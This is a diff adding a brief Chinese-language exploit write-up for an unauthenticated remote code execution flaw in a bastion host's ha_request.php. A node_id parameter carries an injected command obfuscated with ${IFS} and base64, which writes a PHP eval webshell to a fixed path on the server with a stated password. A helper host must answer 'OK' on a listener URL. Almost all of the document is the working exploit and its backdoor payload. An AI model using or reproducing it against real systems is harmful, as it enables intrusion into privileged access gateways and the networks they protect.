@@ -1,0 +1,11 @@
+利用条件：无法登录
+
+　　利用过程:
+
+　　第一，http://10.20.10.11/listener/cluster_manage.php返回“OK”。
+
+　　第二，执行以下链接即可getshell，执行成功后，生成PHP一句话马/var/www/shterm/resources/qrcode/lbj77.php密码10086。这里假设10.20.10.10为堡垒机的IP地址。
+
+https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}-d|bash`|${IFS}|echo${IFS}
+
+
